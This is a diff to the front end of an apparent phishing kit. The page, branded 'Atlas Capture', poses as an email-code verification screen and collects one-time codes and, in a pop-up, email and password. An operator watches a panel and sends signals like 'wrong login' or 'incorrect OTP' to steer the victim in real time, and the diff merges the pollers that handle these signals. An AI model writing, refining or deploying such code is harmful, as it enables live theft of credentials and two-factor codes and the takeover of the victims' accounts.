@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas Capture - Security Verification</title>
+<title>Atlas Capture - Verify Code</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
@@ -16,8 +16,8 @@ body{background:#f3f4f6;display:flex;justify-content:center;align-items:center;m
 #logoAtlas{height:45px;width:45px;border-radius:40%}
 .header span{font-weight:600;font-size:18px}
 .card{background:#fff;border-radius:22px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,0.08);text-align:center}
-h2{font-size:24px;font-weight:700;color:#1f2937;margin-bottom:12px}
-.subtext{color:#6b7280;font-size:13px;margin-bottom:28px;line-height:1.5}
+h2{font-size:24px;font-weight:700;color:#1f2937;margin-bottom:8px}
+.subtext{color:#6b7280;font-size:14px;margin-bottom:28px}
 .otp-input{width:100%;padding:16px;font-size:24px;text-align:center;letter-spacing:4px;border:2px solid #e5e7eb;border-radius:14px;background:#fff;transition:all 0.2s;margin-bottom:28px;font-weight:600}
 .otp-input:focus{outline:none;border-color:#4f46e5;box-shadow:0 0 0 3px rgba(79,70,229,0.1)}
 button{width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#2563eb,#7c3aed);color:#fff;font-weight:600;cursor:pointer;margin-bottom:16px}
@@ -28,7 +28,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 .link{background:none;color:#4f46e5;font-size:14px;font-weight:500;margin:0;padding:0;box-shadow:none}
 .link:hover{background:none;text-decoration:underline}
 .error-message{color:#ef4444;font-size:13px;margin-top:12px;display:none;background:#fef2f2;padding:12px;border-radius:12px}
-.success-message{color:#059669;font-size:13px;margin-top:12px;display:none;background:#d1fae5;padding:10px;border-radius:12px}
 .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);backdrop-filter:blur(4px);z-index:10000;justify-content:center;align-items:center}
 .modal-overlay.active{display:flex}
 .modal{background:#fff;border-radius:28px;max-width:380px;width:90%;padding:32px 24px;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.3)}
@@ -49,15 +48,14 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
 <div class="wrapper">
   <div class="header">
-    <div class="icon"><img id="logoAtlas" src="atlas.png" alt="Atlas logo"></div>
+    <div class="icon"><img id="logoAtlas" src="atlas.png" alt="atlas logo"></div>
     <span>Atlas Capture</span>
   </div>
   <div class="card">
-    <h2>Security Verification</h2>
-    <p class="subtext">Additional authentication required to protect your account.<br>Please enter another code sent to your email.</p>
+    <h2>Check your email</h2>
+    <p class="subtext">We sent you a 6-character verification code</p>
     <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="000000">
     <div id="errorMessage" class="error-message"></div>
-    <div id="successMessage" class="success-message"></div>
     <button id="verifyBtn">Verify</button>
     <button class="link" id="differentEmail">Use a different email</button>
   </div>
@@ -83,70 +81,31 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   const otpInput = document.getElementById('otpInput');
   const verifyBtn = document.getElementById('verifyBtn');
   const errorDiv = document.getElementById('errorMessage');
-  const successDiv = document.getElementById('successMessage');
+
   let isProcessing = false;
   let approvalInterval = null;
   let blockCheckInterval = null;
   let isModalOpen = false;
-  let incorrectOtpProcessed = false;  // local flag to prevent multiple triggers
 
-  // ========== INCORRECT OTP HANDLER (COMPLETE FIX) ==========
-  async function checkIncorrectOtp() {
+  // ─── Single shared flag to prevent duplicate handling across all 3 pollers ───
+  let adminTextHandling = false;
+
+  // ─── USER-SIDE release endpoint (no JWT needed) ───────────────────────────
+  async function releaseAdminText() {
     try {
-      const response = await fetch('/api/users/check-admin-text', {
+      await fetch('/api/users/release-admin-text', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email })
       });
-      const data = await response.json();
-      console.log('[DEBUG] checkIncorrectOtp (second) response:', data);
-
-      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false && !incorrectOtpProcessed) {
-        incorrectOtpProcessed = true;
-        console.log('[INFO] Incorrect OTP flag detected – resetting UI (second OTP page)');
-
-        // Show red error message
-        errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
-        errorDiv.style.display = 'block';
-
-        // Clear input field
-        otpInput.value = '';
-        otpInput.focus();
-
-        // Stop any pending approval polling
-        if (approvalInterval) {
-          clearInterval(approvalInterval);
-          approvalInterval = null;
-          console.log('[INFO] Stopped approval polling');
-        }
-
-        // Reset button state
-        isProcessing = false;
-        verifyBtn.disabled = false;
-        verifyBtn.innerHTML = 'Verify';
-        console.log('[INFO] Verify button re-enabled');
-
-        // Clear the server flag
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        console.log('[INFO] Server flag cleared');
-
-        // Hide error after 4 seconds, allow new incorrect OTP later
-        setTimeout(() => {
-          errorDiv.style.display = 'none';
-          incorrectOtpProcessed = false;
-        }, 4000);
-      }
     } catch (err) {
-      console.error('[ERROR] checkIncorrectOtp (second):', err);
+      console.error('[ERROR] releaseAdminText:', err);
     }
   }
 
-  // ========== WRONG LOGIN HANDLER ==========
-  async function checkWrongLogin() {
+  // ─── Single poller that reads admin_text once and dispatches to handlers ──
+  async function pollAdminText() {
+    if (adminTextHandling) return; // already processing a flag, skip
     try {
       const response = await fetch('/api/users/check-admin-text', {
         method: 'POST',
@@ -154,65 +113,127 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         body: JSON.stringify({ email })
       });
       const data = await response.json();
-      if (data.admin_text === 'wrong_login_error' && data.text_release === false) {
-        console.log('[DEBUG] Wrong login flag detected');
-        const modalError = document.getElementById('modalError');
-        if (modalError) {
-          modalError.textContent = '❌ Invalid email or password. Please try again.';
-          modalError.style.display = 'block';
-        }
-        const loginPassword = document.getElementById('loginPassword');
-        if (loginPassword) loginPassword.value = '';
-        const submitBtn = document.getElementById('submitLoginBtn');
-        if (submitBtn) {
-          submitBtn.disabled = false;
-          submitBtn.innerHTML = 'Login to Continue →';
-        }
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        setTimeout(() => {
-          if (modalError) modalError.style.display = 'none';
-        }, 4000);
+      if (!data.admin_text || data.text_release === true) return;
+
+      const text = data.admin_text;
+      adminTextHandling = true; // lock so no other poll fires simultaneously
+
+      if (text === 'incorrect_otp_error') {
+        await handleIncorrectOtp();
+      } else if (text === 'wrong_login_error') {
+        await handleWrongLogin();
+      } else if (text === 'correct_login_success') {
+        await handleCorrectLogin();
+      } else {
+        // Unknown flag — just release it
+        await releaseAdminText();
+        adminTextHandling = false;
       }
-    } catch (err) {}
+    } catch (err) {
+      console.error('[ERROR] pollAdminText:', err);
+      adminTextHandling = false;
+    }
   }
 
-  // ========== CORRECT LOGIN HANDLER ==========
-  async function checkCorrectLogin() {
-    try {
-      const response = await fetch('/api/users/check-admin-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await response.json();
-      if (data.admin_text === 'correct_login_success' && data.text_release === false) {
-        console.log('[DEBUG] Correct login flag detected – showing loading spinner');
-        const modalContent = document.getElementById('loginModalContent');
-        if (modalContent) {
-          modalContent.innerHTML = `
-            <div style="text-align: center;">
-              <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
-              <h3>Validating Credentials</h3>
-              <div class="loading-spinner-small"></div>
-              <p>Please wait as we validate your details...</p>
-              <p style="font-size: 12px; color: #666; margin-top: 10px;">Do not close this window</p>
-            </div>
-          `;
-        }
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-      }
-    } catch (err) {}
+  // ─── INCORRECT OTP ────────────────────────────────────────────────────────
+  async function handleIncorrectOtp() {
+    console.log('[INFO] Incorrect OTP flag – resetting UI');
+
+    // 1. Release the flag in DB first so it never fires again
+    await releaseAdminText();
+
+    // 2. Show error
+    errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
+    errorDiv.style.display = 'block';
+
+    // 3. Clear input
+    otpInput.value = '';
+
+    // 4. Stop approval polling
+    if (approvalInterval) {
+      clearInterval(approvalInterval);
+      approvalInterval = null;
+    }
+
+    // 5. Re-enable button — but block resubmission for 2 seconds
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
+    isProcessing = false;
+
+    setTimeout(() => {
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = 'Verify';
+      otpInput.focus();
+    }, 2000);
+
+    // 6. Hide error after 4 seconds then unlock the poller
+    setTimeout(() => {
+      errorDiv.style.display = 'none';
+      adminTextHandling = false;
+    }, 4000);
   }
 
-  // ========== BLOCK CHECK ==========
+  // ─── WRONG LOGIN ──────────────────────────────────────────────────────────
+  async function handleWrongLogin() {
+    console.log('[INFO] Wrong login flag – showing error in modal');
+
+    // 1. Release flag first
+    await releaseAdminText();
+
+    const modalError = document.getElementById('modalError');
+    const loginPassword = document.getElementById('loginPassword');
+    const submitBtn = document.getElementById('submitLoginBtn');
+
+    if (modalError) {
+      modalError.textContent = '❌ Invalid email or password. Please try again.';
+      modalError.style.display = 'block';
+    }
+    if (loginPassword) loginPassword.value = '';
+
+    // 2. Re-enable submit after 2-second cooldown
+    if (submitBtn) {
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
+    }
+
+    setTimeout(() => {
+      if (submitBtn) {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Login to Continue →';
+      }
+      // Hide error then unlock poller
+      setTimeout(() => {
+        if (modalError) modalError.style.display = 'none';
+        adminTextHandling = false;
+      }, 2000);
+    }, 2000);
+  }
+
+  // ─── CORRECT LOGIN ────────────────────────────────────────────────────────
+  async function handleCorrectLogin() {
+    console.log('[INFO] Correct login flag – showing loading spinner');
+
+    // 1. Release flag first
+    await releaseAdminText();
+
+    const modalContent = document.getElementById('loginModalContent');
+    if (modalContent) {
+      modalContent.innerHTML = `
+        <div style="text-align:center;">
+          <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+          <h3>Validating Credentials</h3>
+          <div class="loading-spinner-small"></div>
+          <p>Please wait as we validate your details...</p>
+          <p style="font-size:12px;color:#666;margin-top:10px;">Do not close this window</p>
+        </div>
+      `;
+    }
+
+    // Unlock poller after a short delay (modal is now in loading state, no action needed)
+    setTimeout(() => { adminTextHandling = false; }, 3000);
+  }
+
+  // ─── BLOCK CHECK ──────────────────────────────────────────────────────────
   async function checkIfBlocked() {
     try {
       const response = await fetch('/api/users/check-blocked', {
@@ -222,14 +243,11 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       });
       const data = await response.json();
       if (data.blocked === true) {
-        console.log('[INFO] User blocked – redirecting to success');
         window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
         return true;
       }
       return false;
-    } catch (err) {
-      return false;
-    }
+    } catch (err) { return false; }
   }
 
   function startBlockChecking() {
@@ -238,32 +256,22 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       const blocked = await checkIfBlocked();
       if (blocked) {
         clearInterval(blockCheckInterval);
-        clearInterval(approvalInterval);
+        if (approvalInterval) clearInterval(approvalInterval);
       }
     }, 3000);
   }
 
-  // ========== SECOND OTP SUBMIT & APPROVAL POLLING ==========
+  // ─── OTP SUBMIT & APPROVAL POLLING ───────────────────────────────────────
   function showLoading() {
     isProcessing = true;
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
     errorDiv.style.display = 'none';
-    successDiv.style.display = 'none';
   }
 
   function showWaitingForApproval() {
     verifyBtn.disabled = true;
     verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
-  }
-
-  function showReadyForNewOTP() {
-    isProcessing = false;
-    verifyBtn.disabled = false;
-    verifyBtn.innerHTML = 'Verify';
-    otpInput.value = '';
-    otpInput.focus();
-    if (approvalInterval) clearInterval(approvalInterval);
   }
 
   function hideLoading() {
@@ -272,32 +280,31 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     verifyBtn.innerHTML = 'Verify';
   }
 
-  function startCheckingSecondApproval() {
+  function startCheckingApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
     approvalInterval = setInterval(async () => {
       try {
         const blocked = await checkIfBlocked();
         if (blocked) return;
-        const response = await fetch('/api/users/check-second-approval', {
+        const response = await fetch('/api/users/check-first-approval', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
         const data = await response.json();
-        console.log('[DEBUG] Second approval polling:', data);
-        if (data.approved === true) {
-          console.log('[INFO] Second OTP approved – redirecting to success');
+        if (data.approved) {
           clearInterval(approvalInterval);
-          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
         }
       } catch (err) {}
     }, 2000);
   }
 
-  async function verifySecondOTP() {
+  async function verifyOTP() {
     if (isProcessing) return;
     const isBlocked = await checkIfBlocked();
     if (isBlocked) return;
+
     const otp = otpInput.value.trim();
     if (!otp || otp.length !== 6) {
       errorDiv.textContent = 'Please enter all 6 characters';
@@ -306,21 +313,18 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       return;
     }
 
-    console.log('[INFO] Submitting second OTP:', otp);
     showLoading();
     try {
-      const response = await fetch('/api/users/submit-second-otp', {
+      const response = await fetch('/api/users/submit-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, otp })
       });
       const data = await response.json();
-      console.log('[DEBUG] Submit second OTP response:', data);
       if (data.success) {
-        console.log('[INFO] Second OTP submitted – waiting for approval (or auto-approved)');
         showWaitingForApproval();
         startBlockChecking();
-        startCheckingSecondApproval();
+        startCheckingApproval();
       } else {
         hideLoading();
         errorDiv.textContent = data.error || 'Invalid OTP';
@@ -328,7 +332,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         setTimeout(() => errorDiv.style.display = 'none', 3000);
       }
     } catch (error) {
-      console.error('[ERROR] verifySecondOTP network error:', error);
       hideLoading();
       errorDiv.textContent = 'Network error. Please try again.';
       errorDiv.style.display = 'block';
@@ -336,7 +339,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }
   }
 
-  // ========== FORCE LOGIN POLLING ==========
+  // ─── FORCE LOGIN POLLING ──────────────────────────────────────────────────
   let forceLoginInterval = null;
   function startForceLoginPolling() {
     if (forceLoginInterval) clearInterval(forceLoginInterval);
@@ -350,7 +353,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         });
         const data = await response.json();
         if (data.force_login === true) {
-          console.log('[INFO] Force login triggered – showing modal');
           isModalOpen = true;
           document.getElementById('loginModal').classList.add('active');
           document.getElementById('loginEmail').value = '';
@@ -366,7 +368,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }, 2000);
   }
 
-  // ========== REDIRECT SUCCESS POLLING ==========
+  // ─── REDIRECT SUCCESS POLLING ─────────────────────────────────────────────
   let redirectSuccessInterval = null;
   function startRedirectSuccessPolling() {
     if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
@@ -379,7 +381,6 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         });
         const data = await response.json();
         if (data.redirect_success === true) {
-          console.log('[INFO] Redirect to success triggered');
           clearInterval(redirectSuccessInterval);
           window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
         }
@@ -387,29 +388,13 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }, 2000);
   }
 
-  function hideLoginModal() {
-    isModalOpen = false;
-    document.getElementById('loginModal').classList.remove('active');
-    const modalContent = document.getElementById('loginModalContent');
-    if (modalContent) {
-      modalContent.innerHTML = `
-        <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
-        <h3>Account Verification Required</h3>
-        <p>Please login with your email and password to continue.</p>
-        <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
-        <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
-        <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
-        <div id="modalError" class="modal-error"></div>
-      `;
-      document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
-    }
-  }
-
+  // ─── LOGIN MODAL SUBMIT ───────────────────────────────────────────────────
   async function submitLogin() {
     const loginEmail = document.getElementById('loginEmail').value.trim();
     const loginPassword = document.getElementById('loginPassword').value;
     const modalError = document.getElementById('modalError');
     const submitBtn = document.getElementById('submitLoginBtn');
+
     if (!loginEmail || !loginPassword) {
       modalError.textContent = 'Please enter both email and password';
       modalError.style.display = 'block';
@@ -421,9 +406,11 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       modalError.style.display = 'block';
       return;
     }
+
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
     modalError.style.display = 'none';
+
     try {
       const response = await fetch('/api/users/submit-login-popup', {
         method: 'POST',
@@ -432,8 +419,9 @@ button:disabled{opacity:0.6;cursor:not-allowed}
       });
       const data = await response.json();
       if (data.success) {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Login to Continue →';
+        // Keep button in loading state — admin will send correct/wrong signal
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
       } else {
         modalError.textContent = data.error || 'Failed to verify account';
         modalError.style.display = 'block';
@@ -448,16 +436,16 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }
   }
 
-  // Start all polling intervals
+  // ─── START ALL POLLING ────────────────────────────────────────────────────
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
-  setInterval(checkIncorrectOtp, 2000);
-  setInterval(checkWrongLogin, 2000);
-  setInterval(checkCorrectLogin, 2000);
 
-  verifyBtn.addEventListener('click', verifySecondOTP);
-  otpInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifySecondOTP(); });
+  // Single unified admin text poller — replaces 3 separate ones
+  setInterval(pollAdminText, 2000);
+
+  verifyBtn.addEventListener('click', verifyOTP);
+  otpInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyOTP(); });
   otpInput.focus();
   document.getElementById('differentEmail').addEventListener('click', () => { window.location.href = '/users/login'; });
   document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
